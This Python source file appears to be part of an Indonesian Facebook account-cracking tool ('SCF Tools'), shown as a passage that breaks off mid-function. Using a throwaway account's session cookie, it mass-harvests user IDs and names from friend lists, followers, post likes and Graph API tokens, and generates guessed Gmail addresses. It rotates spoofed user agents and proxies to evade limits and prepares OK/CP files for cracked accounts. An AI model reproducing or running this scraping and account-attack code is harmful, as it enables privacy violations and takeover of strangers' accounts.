try:
    import re, os, sys, bs4, time, json, rich, base64
    import requests, random, datetime, platform
    from concurrent.futures import ThreadPoolExecutor as bool
    from concurrent.futures import ThreadPoolExecutor as Ndobol
    from time import time as mark
    from bs4 import BeautifulSoup as parser
    from datetime import datetime
    from time import sleep
except (ModuleNotFoundError, ImportError) as e:
    os.system('clear') ; sys.exit(f' \33[m[\x1b[1;91mError Module\33[m] {str(e).title()}\n \33[m[\x1b[1;91mError Module\33[m] Module \x1b[1;91m{str(e.name)} \33[mBelum Terinstall\n \33[m[\x1b[1;91mError Module\33[m] Silahkan install dengan ketik <=> pip install \x1b[1;92m{str(e.name)}')

try:
    from rich.panel import Panel
    from rich.tree import Tree
    from rich import print as prints
    from rich.console import Console
    from rich.table import Table
    from rich.columns import Columns
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
except ImportError as e:
    os.system('clear') ; sys.exit(f' \33[m[\x1b[1;91mError Module\33[m] {str(e).title()}\n \33[m[\x1b[1;91mError Module\33[m] Module \x1b[1;91m{str(e.name)} \33[mError')

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
sekarang = str(tgl)+" "+str(bln)+" "+str(thn)
sys.stdout.write('\x1b]2; SCF Projects | @AdtyaExec_\x07')
dump = []
oK = ('''OK-{}-{}-{}.txt'''.format(tgl, bln, thn))
cP = ('''CP-{}-{}-{}.txt'''.format(tgl, bln, thn))

userAgent1, userAgent2 = [], []

for x in range(1000):
    rr = random.randint
    rc = random.choice
    build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
    ua1 = f"Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,99))}.0.{str(rr(2000,2999))}.{str(rr(75,199))} Mobile Safari/537.36"
    ua2 = f"Mozilla/5.0 (Linux; Android {str(rr(7,13))}; Lenovo TB-X606F Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,199))}.0.{str(rr(5500,5999))}.{str(rr(30,99))} Safari/537.36"
    ua3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; ALT-L29 Build/HUAWEIALT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,99))}.0.{str(rr(4500,4999))}.{str(rr(75,199))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(400,499))}.0.0.0.{str(rr(55,99))};]"
    askk = rc([ua1, ua2, ua3])
    userAgent1.append(askk)

for xc in range(900):
    rr = random.randint
    rc = random.choice
    build1 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
    build2 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(5)))
    build3 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(5)))
    build4 = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for y in range(7)))
    type = rc(["RMX1911","RMX3125","RMX3357","RMX3396","RMX3571"])
    uas1 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(7,12))}; moto g play - 2023 Build/{build1}.{str(rr(35,99))}-{str(rr(55,75))}-{str(rr(0,3))})"
    uas2 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(8,13))}; Android SDK built for arm64 Build/SP2A.{str(rr(200000,299999))}.008)"
    uas3 = f"Dalvik/2.1.0 (Linux; U; Android 13; SH-53C Build/{build2})"
    uas4 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; moto g stylus 5G (2022) Build/T2SDS33.{str(rr(65,99))}-38-1-3)"
    uas5 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(7,12))}; LAVA LZG403 225I Build/RP1A.{str(rr(199999,299999))}.011)"
    uas6 = f"Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UD1A.{str(rr(200000,299999))}.041)"
    uas7 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,12))}; octopus Build/R118-{str(rr(11111,19999))}.{str(rr(40,99))}.0)"
    uas8 = f"Dalvik/2.1.0 (Linux; U; Android 13; ANY-LX3 Build/HONORANY-{build3})"
    uas9 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(7,13))}; {type} Build/QKQ1.{str(rr(111111,299999))}.002) AppleWebKit [PB/{str(rr(105,199))}]"
    uas10 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(7,12))}; Redmi {str(rr(4,8))} MIUI/V11.0.12.0.{build4}) AppleWebKit [PB/107]"
    okhhe = rc([uas1, uas2, uas3, uas4, uas5, uas6])
    userAgent2.append(okhhe)

def RedmiRandom():
    pars = {'android': random.randrange(5,20),'versi': random.randrange(4,15),'chrome':random.randint(70,117),'jaringan':random.randrange(2,5)}
    uar1 = 'Mozilla/5.0 (Linux; U; Android {android}; zh-CN; Mi {versi} Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome}.0.4896.58 Quark/6.2.7.249 Mobile Safari/537.36'.format(**pars)
    uar2 = 'Mozilla/5.0 (Linux; Android {android}; MI {versi} Lite Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome}.0.5304.54 Mobile Safari/537.36'.format(**pars)
    uar3 = 'Mozilla/5.0 (Linux; Android {android}; Mi {versi}s {jaringan}G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome}.0.4472.101 Mobile Safari/537.36'.format(**pars)
    uas1 = 'Mozilla/5.0 (Linux; Android {android}; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/{chrome}.0.4515.166 Mobile Safari/537.36'.format(**pars)
    retn = random.choice([uar1,uar2,uar3,uas1])
    return(str(retn))

def opera():
	rr = random.randint
	rc = random.choice
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	jancok = rc([ua1,ua2,ua3,ua4,ua5])
	return jancok
    
def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008','10009']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fl) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
	
class Facebook:
   
   def __init__(self):
       self.ses = requests.Session()
       self.query = self.ses.get('http://ip-api.com/json').json()['query']
       self.country = self.ses.get('http://ip-api.com/json').json()['country']
       self.bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
       self.waktu = str(datetime.now().strftime('%H:%M:%S'))
       self._hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
       self.atmin = "- 𝐉𝐚𝐧𝐠𝐚𝐧 𝐋𝐮𝐩𝐚 𝐊𝐮𝐧𝐣𝐮𝐧𝐠𝐢 𝐀𝐤𝐮𝐧 𝐀𝐝𝐦𝐢𝐧\n- https://www.facebook.com/1072901466/posts/1053797546035333/?substory_index=1053797546035333&app=fbl"
       self.url = "https://mbasic.facebook.com"
       self.bot_ = "𝐊𝐨𝐦𝐞𝐧𝐭𝐚𝐫 𝐈𝐧𝐢 𝐃𝐢𝐭𝐮𝐥𝐢𝐬 𝐎𝐥𝐞𝐡 @𝐀𝐝𝐢𝐭𝐲𝐚𝐄𝐱𝐞𝐜_"
       self.prox = open('data/proxies.txt','r').read().splitlines()
       self.id, self.id2, self.muda, self.pwnya = [], [], [], []
       self.ok, self.cp, self.loop = [], [], 0
       self.ua_manual, self.ua_kamu, self.methode = [], [], []
       self.Directory()

   def clearTerminal(self, platform):
       if "linux" in sys.platform.lower():os.system("clear")
       elif "win" in sys.platform.lower():os.system("cls")
   
   def Directory(self):
       try:os.mkdir("/sdcard/SCF-DUMP")
       except Exception as e : pass
       try:os.mkdir("data")
       except Exception as e : pass
       try:os.mkdir("OK")
       except Exception as e : pass
       try:os.mkdir("CP")
       except Exception as e : pass
       
   def waktuu(self):
       try:
           now = datetime.now()
           hours = now.hour
           if 4 <= hours < 12:timenow = "Selamat Pagi"
           elif 12 <= hours < 15:timenow = "Selamat Siang"
           elif 15 <= hours < 18:timenow = "Selamat Sore"
           else:timenow = "Selamat Malam"
           return timenow
       except:pass

   def Deleteee(self):
       try:
             os.remove('data/Cookie')
             os.remove('data/Token')
             #os.remove('data/TokenEAAG')
       except Exception as e : pass

   def Logoo(self):
       prints(Panel(f''' {H2}___   ___        ___        ___ 
|   |=|_.'   .'|=|_.'   .'|=|_.' 
`.  |      .'  |      .'  |  ___ 
  `.|=|`.  |   |      |   |=|_.' 
 ___  |  `.`.  |  ___ |   |      
 `._|=|___|  `.|=|_.' |___|\n      
      {P2}@AdityaExec_ | SCF                                ''',width=80,padding=(1,18),title=f"{M2}● {K2}● {H2}●",title_align=f"{str(random.choice(['right', 'left']))}",style="light_steel_blue"))

   def Login(self):
       self.clearTerminal(platform) ; self.Logoo()
       urut = []
       urut.append(Panel(f"{H2}{self.query}",title=f"{P2}IP",subtitle=f"{K2}{self.country}",padding=(0,6)))
       Console(width=70,style="light_steel_blue").print(Columns(urut),justify="center")
       prints(Panel(f'''{P2}silahkan masukan cookie facebook anda, pastikan akun tumbal jika akun facebook anda terdapat A2F anda bisa pergi ke link dibawah\n\n      {P2}- {H2}https://business.facebook.com/business_locations {P2}- \npastikan kode benar, dan masukan kode autentikasi dua faktor anda''',width=80,padding=(0,2),style="light_steel_blue"))
       try:
            cok = Console().input(f''' {P2}[{H2}*{P2}] Masukan cookie : ''')
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if 'href="/zero/optin/write/' in str(link):
                Console().print(f" {P2}[{H2}*{P2}] anda sedang menggunakan mode free facebook") ; sleep(3.2)
                Console().print(f" {P2}[{H2}*{P2}] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
                poss = parser(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
                Console().print(f" {P2}[{H2}*{P2}] proses mengubah ke mode data telah selesai.\n {P2}[{H2}*{P2}] silahkan masukan ulang cookie nya dengan mengetik python run.py")
            elif 'href="/x/checkpoint/' in str(link):
                Console().print(f" {P2}[{H2}*{P2}] opshh cookie anda chekcpoint") ; sleep(3) ; self.Login()
            elif 'href="/r.php' in str(link):
                Console().print(f" {P2}[{H2}*{P2}] cookie yang anda masukan invalid") ; sleep(3) ; self.Login()
            else:
                Console().print(f" {P2}[{H2}*{P2}] mohon tunggu sebentar cuy...")
                self.ubah_bahasa({"cookie": cok})
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                open('data/Cookie', 'w').write(cok) ; open('data/Token', 'w').write(f"{nama}|{user}")
                prints(Panel(f'{P2}Selamat datang {H2}{nama} {P2}di SCF Tools',width=80,padding=(0,12),style="light_steel_blue"))
                prints(Panel(f'{P2}Cookie {H2}valid {P2}atau {H2}aktif {P2}silahkan jalankan ulang scriptnya',width=80,padding=(0,6),style="light_steel_blue")) ; sleep(3) ; sys.exit()
       except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")

   def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = parser(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

   def Menuu(self):
       self.clearTerminal(platform) ; self.Logoo()
       urut = []
       urut.append(Panel(f"{H2}{self.waktuu()}",padding=(0,2)))
       Console(width=70,style="light_steel_blue").print(Columns(urut),justify="center")
       try:
            b = self.ses.get(f"https://app.cryptolens.io/api/key/Activate?token=WyI2NzkxMDY1OCIsInRudmtMdy9KbmZseEtOR2swblVjSktKT2JkN2RJQXU1NzNFa1REYUEiXQ==&ProductId=22785&Key={open('data/.LisensiLog.json','r').read()}").json()
            c        = b['licenseKey']
            key      = c['key'][0:11]
            tahun    = c['expires'][0:4]
            buln     = c['expires'][5:7]
            tanggal  = c['expires'][8:10]
            bulan    = self.bulan_ttl[buln]
            tahun1   = c['created'][0:4]
            buln1    = c['created'][5:7]
            tanggal1 = c['created'][8:10]
            bulan1   = self.bulan_ttl[buln1]
       except:
            key       = "-"
            tanggal   = "-"
            bulan     = "-"
            tahun     = "-"
            tanggal1  = "-"
            bulan1    = "-"
            tahun1    = "-"
       try:
           cok = open('data/Cookie','r').read()
       except Exception as e:
           prints(Panel(f'{P2}anda belum login {str(e).title()}',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; self.Login()
       try:
           nama, user = open("data/Token", "r").read().split("|")
       except Exception as e:
           prints(Panel(f'{P2}opshhh akun tumbal anda terkena checkpoint silahkan login lagi ya',width=80,padding=(0,2),style="light_steel_blue")) ; self.Deleteee() ; sleep(3.1) ; self.Login()
       except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError) as e:
           prints(Panel(f'{P2}Koneksi kamu buruk pastikan terhubung dengan internet atau WiFi ya',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; sys.exit()
       urut = []
       urut.append(Panel(f'{P2}[{H2}*{P2}] Nama : {H2}{nama}\n{P2}[{H2}*{P2}] Id   : {H2}{user}\n{P2}[{H2}*{P2}] cry  : {H2}{self.country}',width=35,padding=(0,1),style="light_steel_blue"))
       urut.append(Panel(f'''{P2}[{H2}*{P2}] lisensi : {H2}{key}-**-**\n{P2}[{H2}*{P2}] join    : {H2}{tanggal1} {bulan1} {tahun1}\n{P2}[{H2}*{P2}] expired : {H2}{tanggal} {bulan} {tahun}''',width=35,padding=(0,1),style="light_steel_blue"))
       Console().print(Columns(urut))
       prints(Panel(f'''{P2}[{H2}01{P2}]. Dump id dari publik         {P2}[{H2}06{P2}]. Dump id dari file\n{P2}[{H2}02{P2}]. Dump id dari publik massal  {P2}[{H2}07{P2}]. Dump id ke file\n{P2}[{H2}03{P2}]. Dump id dari followers      {P2}[{H2}08{P2}]. Dump id search nama\n{P2}[{H2}04{P2}]. Dump id dari like post      {P2}[{H2}09{P2}]. Check hasil OK/CP\n{P2}[{H2}05{P2}]. Dump id dari email          {P2}[{H2}00{P2}]. Logout ({K2}Hapus cookie{P2})''',width=80,padding=(0,4),style="light_steel_blue"))
       prints(Panel(f"{P2}Ketik {H2}'lain' {P2}untuk ke menu lainnya dan {H2}'bot' {P2}untuk ke menu bot",width=80,padding=(0,3),style="light_steel_blue"))
       ykh = Console().input(f''' {P2}[{H2}*{P2}] Pilihan menu ({H2}1{P2}/{H2}2{P2}/{H2}3{P2}) : ''')
       if ykh =='1' or ykh =='01':self.dump_Publik()
       elif ykh =='2' or ykh =='02':self.dump_PublikMassal()
       elif ykh =='3' or ykh =='03':self.dump_followers()
       elif ykh =='4' or ykh =='04':self.dump_Likes()
       elif ykh =='5' or ykh =='05':self.dump_Email()
       elif ykh =='6' or ykh =='06':self.dump_Files()
       elif ykh =='7' or ykh =='07':self.dump_IdFile()
       elif ykh =='8' or ykh =='08':self.dump_Search()
       elif ykh =='9' or ykh =='09':self.Check_Hasil()
       elif ykh =='0' or ykh =='00':self.Logout()
       elif ykh =='Lain' or ykh =='lain' or ykh =='LAIN':self.Lainya()
       elif ykh =='Bot' or ykh =='bot' or ykh =='BOT':self.Boot()
       else:prints(Panel(f'{P2}Silahkan masukan pilihan menu di atas yang benar cnth : {H2}1{P2}/{H2}2{P2}/{H2}3{P2} ',width=80,padding=(0,3),style="light_steel_blue")) ; sleep(3.1) ; self.Menuu()

   def Boot(self):
       prints(Panel(f'{P2}Opshhh menu sedang tahap pengembangan, silahkan tunggu ya',width=80,padding=(0,5),style="light_steel_blue"))
       sleep(3.2) ; self.Menuu()

   def Lainya(self):
       prints(Panel(f'{P2}Opshhh menu sedang tahap pengembangan, silahkan tunggu ya',width=80,padding=(0,5),style="light_steel_blue"))
       sleep(3.2) ; self.Menuu()
       
   def dump_Publik(self):
       cook = {"cookie": open("data/Cookie", "r").read()}
       prints(Panel(f'{P2}Anda bisa mengetik {H2}"me" {P2}untuk dump dari list teman anda sendiri',width=80,padding=(0,3),style="light_steel_blue"))
       user = Console().input(f" {P2}[{H2}*{P2}] Masukan id atau username : ")
       if "me" in user:
          try:
              link = parser(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
              if "Anda Diblokir Sementara" in link:
                 Console().print(f" {P2}[{M2}!{P2}] Facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun") ; sleep(3.1) ; sys.exit()
              else:
                   print("[!] to stop press CTRL then press C on your keyboard.")
                   self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
          except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
              prints(Panel(f'{P2}Koneksi kamu buruk pastikan terhubung dengan internet atau WiFi ya',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; sys.exit()
          self.setting_uid()
       else:
            try:
                link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
                if "Halaman Tidak Ditemukan" in link:
                   Console().print(f" {P2}[{M2}!{P2}] Pengguna dengan {user} tidak ditemukan") ; sleep(3) ; sys.exit()
                elif "Anda Diblokir Sementara" in link:
                    Console().print(f" {P2}[{M2}!{P2}] Facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun") ; sleep(3.1) ; sys.exit()
                elif "Konten Tidak Ditemukan" in link:
                    Console().print(f" {P2}[{M2}!{P2}] Pengguna dengan {user} tidak ditemukan") ; sleep(3) ; sys.exit()
                else:
                    self.batur(f"{self.url}/{user}/friends", cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                prints(Panel(f'{P2}Koneksi kamu buruk pastikan terhubung dengan internet atau WiFi ya',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; sys.exit()
            self.setting_uid()

   def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"<=>"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r {N}[{H}!{N}] Sedang mengumpulkan {H}{str(len(self.id))}{N} id..");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur(self.url+parser(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass
   
   def dump_PublikMassal(self):
       try:
           cok = open('data/Cookie','r').read()
           tok = open('data/TokenEAAG','r').read()
       except Exception as e:
           prints(Panel(f'{P2}anda belum login {str(e).title()}',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; self.Login()
       prints(Panel(f'{P2}Masukan jumlah target yang ingin kamu dump, cnth 3, 8, 10, 33',width=80,padding=(0,4),style="light_steel_blue"))
       try:idx = int(Console().input(f" {P2}[{H2}*{P2}] Jumlah target : "))
       except:idx=1
       prints(Panel(f'{P2}Anda bisa mengetik {H2}"me" {P2}untuk dump dari list teman anda sendiri',width=80,padding=(0,3),style="light_steel_blue"))
       for XyaaCode in range(idx):
           XyaaCode +=1
           userId = Console().input(f" {P2}[{H2}*{P2}] Masukan id ke {H2}{XyaaCode}{P2} : ")
           try:
                params = (
                   {
                       'access_token': tok,
                       'fields': 'friends'
                   }
                )
                ytta = self.ses.get('https://graph.facebook.com/'+userId, params = params, cookies = {'cookies':cok}).json()
                for xc in ytta["friends"]["data"]:
                    self.id.append(xc["id"]+"|"+xc["name"])
                    Console().print(f" {P2}[{H2}!{P2}] Mengumpulkan {H2}{len(self.id)}",end="\r")
           except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError) as e:
                prints(Panel(f'{P2}Koneksi kamu buruk pastikan terhubung dengan internet atau WiFi ya',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; sys.exit()
           except KeyError as e:
                prints(Panel(f'{P2}Opshh gagal mengambil id target kemungkinan id tidaklah publik',width=80,padding=(0,3),style="light_steel_blue")) ; sleep(3) ; continue
       self.setting_uid()
   
   def dump_followers(self):
       try:
           tok = open('data/TokenEAAG','r').read()
           cok = open('data/Cookie','r').read()
       except Exception as e:
           prints(Panel(f'{P2}anda belum login {str(e).title()}',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; self.Login()
       prints(Panel(f'''\r{P2}masukan id target, ketik {H2}'me' {P2}untuk dump followers sendiri''',width=80,padding=(0,5),style="light_steel_blue"))
       userId = Console().input(f" {P2}[{H2}*{P2}] Masukan id target : ")
       try:
           url = self.ses.get(f'https://graph.facebook.com/{userId}?fields=subscribers.limit(99999)&access_token={tok}', cookies = {'cookie': cok}).json()
           for xc in url['subscribers']['data']:
               try:self.id.append(xc['id']+'|'+xc['name'])
               except:continue
               Console().print(f" {P2}[{H2}!{P2}] Mengumpulkan {H2}{xc['id']}{P2}|{K2}{len(self.id)} {P2}userId...",end="\r")
           self.setting_uid()
       except requests.exceptions.ConnectionError as e:
           prints(Panel(f'{P2}Koneksi kamu buruk pastikan terhubung dengan internet atau WiFi ya',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; sys.exit()
       except (KeyError, IOError) as e :
           prints(Panel(f'{P2}id yang anda masukan tidak tersedia followers atau private',width=80,padding=(0,4),style="light_steel_blue")) ; sleep(3) ; sys.exit()
   
   def dump_Likes(self):
       try:
           tok = open('data/TokenEAAG','r').read()
           cok = open('data/Cookie','r').read()
       except Exception as e:
           prints(Panel(f'{P2}anda belum login {str(e).title()}',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; self.Login()
       prints(Panel(f'''\r{P2}masukan id post, cnth {H2}6793955827363636{P2}, {H2}10226075528609408''',width=80,padding=(0,6),style="light_steel_blue"))
       userLink = Console().input(f" {P2}[{H2}*{P2}] Masukan id post : ")
       try:
           url = self.ses.get(f'https://graph.facebook.com/v1.0/{userLink}?fields=likes.limit(99999)&access_token={tok}',cookies = {'cookie': cok}).json()
           for xc in url['likes']['data']:
               try:self.id.append(xc['id']+'|'+xc['name'])
               except:continue
               Console().print(f" {P2}[{H2}!{P2}] Mengumpulkan {H2}{xc['id']}{P2}|{K2}{len(self.id)} {P2}userId...",end="\r")
           self.setting_uid()
       except requests.exceptions.ConnectionError as e:
           prints(Panel(f'{P2}Koneksi kamu buruk pastikan terhubung dengan internet atau WiFi ya',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.1) ; sys.exit()
       except (KeyError, IOError) as e:
           prints(Panel(f'{P2}id yang anda masukan tidak tersedia like atau private',width=80,padding=(0,6),style="light_steel_blue")) ; sleep(3) ; sys.exit()
   
   def dump_Email(self):
       rr = random.randint
       rc = random.choice
       dump = []
       xc = ["yuli","jasmin","aditya","putra","mahesa","yanto","agus","yayan","jamal","indri","ayu","lala","pandu","nadia","sinta","sindi","sintia","hani","dafit","radit","devi","jihan","sella","ririn","ara","nadifa","mark","nabila","bila","biyan","nuraeni","minto","maman","asep","sri","tari","via","ibnu","aldi","tini","nunung"]
       blk = ["saputri","saputra","cans","putri","nur","amelia","parto","cantik","ganteng","gans","muhammad","kliwon","glass","gilang","ramadan","ramadhani","dani","indah","riko","andy","andi","bisma","kanzul","narmi","dwi","prastyo"]
       prints(Panel(f'{P2}Masukan nama gmail, cnth Aditya, XyaaCode, Mark Zuckerberg, Jasmin',width=80,padding=(0,1),style="light_steel_blue"))
       ykhh = Console().input(f" {P2}[{H2}*{P2}] Masukan nama : ")
       if ykhh =='' or ykhh =='':Console().print(f' {P2}[{M2}!{P2}] Masukan nama dan jangan kosong') ; sleep(3) ; sys.exit()
       prints(Panel(f'{P2}Masukan total dump atau limit dump, maksimal dump {H2}5000{P2} id',width=80,padding=(0,5),style="light_steel_blue"))
       jumlah = Console().input(f" {P2}[{H2}*{P2}] Total dump : ")
       for xyz in range(int(jumlah)):
           A = ykhh
           B = [f'{str(rc(xc))}',f'{str(rr(0,10000))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,10000))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,10000))}',f'{str(rc(xc))}{str(rc(blk))}']
           C = f'@gmail.com'
           D = f'{A}{str(rc(B))}{C}'
           if D in self.id:pass
           else:self.id.append(D+'|'+ykhh)
           if len(dump)==99999:self.setting_uid()
           Console().print(f" {P2}[{H2}!{P2}] Mengumpulkan {H2}{len(self.id)} {P2}userId...",end="\r")
           sleep(0.0000003)
       self.setting_uid()
   
   def dump_Files(self):
       try:
           list = os.listdir('/sdcard/SCF-DUMP/')
       except FileNotFoundError as e:
           prints(Panel(f'{P2}Opshhh anda tidak memiliki file dump, silahkan dump terlebih dahulu di menu utama dan otomatis file dump anda tersedia di crack file',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.5) ; self.Menuu()
       if len(list)==0:
          prints(Panel(f'{P2}Opshhh anda tidak memiliki file dump, silahkan dump terlebih dahulu di menu utama dan otomatis file dump anda tersedia di crack file',width=80,padding=(0,1),style="light_steel_blue")) ; sleep(3.5) ; self.Menuu()
       else:
             yhkk = 0
             bool = {}
             for why in list:
                 try:hem = open('/sdcard/SCF-DUMP/'+why,'r').readlines()
